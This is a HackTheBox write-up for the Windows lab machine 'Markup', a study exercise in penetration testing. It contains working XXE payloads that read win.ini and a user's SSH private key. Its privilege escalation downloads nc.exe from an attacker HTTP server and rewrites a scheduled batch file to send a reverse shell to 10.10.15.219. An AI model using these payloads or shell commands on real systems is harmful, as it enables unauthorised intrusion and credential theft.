# Markup

**Platform:** HackTheBox  
**OS:** Windows  
**Difficulty:** Easy  
**Date:** April 2026

---

## Summary

Windows machine running a web application vulnerable to XXE 
(XML External Entity) injection. Reading SSH private key via XXE 
allows access as daniel. A scheduled batch file in Log-Management 
folder is writable and used to escalate privileges to Administrator.

---

## 1. Reconnaissance

Port scan using nmap:

```bash
nmap -sCV -p- 10.129.95.192
```

**Open ports:**

| Port | Service |
|------|---------|
| 22 | SSH |
| 80 | HTTP Apache 2.4.41 |
| 443 | HTTPS |

---

## 2. Web Application Access

Logged into the web application with default credentials:
admin:password

Intercepted the order request with Burp Suite and identified
XML version 1.0 being used.

---

## 3. XXE Injection

Sent malicious XML payload via Burp Suite Repeater:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
]>
<order>
<quantity>7</quantity>
<item>&xxe;</item>
<address>test</address>
</order>
```

Confirmed Windows 64-bit system. Then extracted daniel's SSH key:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM 'file:///c:/users/daniel/.ssh/id_rsa'>]>
<order>
<quantity>7</quantity>
<item>&xxe;</item>
<address>test</address>
</order>
```

---

## 4. SSH Access as Daniel

Saved the private key and set correct permissions:

```bash
mousepad daniel_rsa
chmod 600 daniel_rsa
ssh -i daniel_rsa daniel@10.129.95.192
```

Retrieved user flag:
type C:\Users\Daniel\Desktop\user.txt

---

## 5. Privilege Escalation

Found a writable batch file in Log-Management:
type C:\Log-Management\job.bat

File executes wevtutil.exe as Administrator.

Downloaded nc.exe to target from attacker machine:

```bash
# Attacker
locate nc.exe
cp /path/nc.exe ~/Downloads/
python3 -m http.server 80
```

```powershell
# Target
powershell
cd C:\Log-Management
wget http://10.10.15.219/nc.exe -outfile nc.exe
exit
```

Started listener on attacker:

```bash
nc -lvnp 4444
```

Modified job.bat to execute reverse shell:
cd C:\Log-Management
echo C:\Log-Management\nc.exe -e cmd.exe 10.10.15.219 4444 > job.bat

Received shell as Administrator and retrieved root flag:
type C:\Users\Administrator\Desktop\root.txt

---

## 6. Flags

- user.txt ✅
- root.txt ✅

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port and service enumeration |
| Burp Suite | Intercepting and modifying requests |
| XXE Payload | Reading system files |
| nc.exe | Reverse shell on Windows |
| python3 http.server | Serving files to target |

---

## Vulnerabilities Found

| Vulnerability | Description |
|--------------|-------------|
| XXE Injection | XML parser reads external files |
| SSH Key Exposure | Private key readable via XXE |
| Weak Credentials | Default admin:password accepted |
| Writable Scheduled Task | job.bat modifiable by low privilege user |
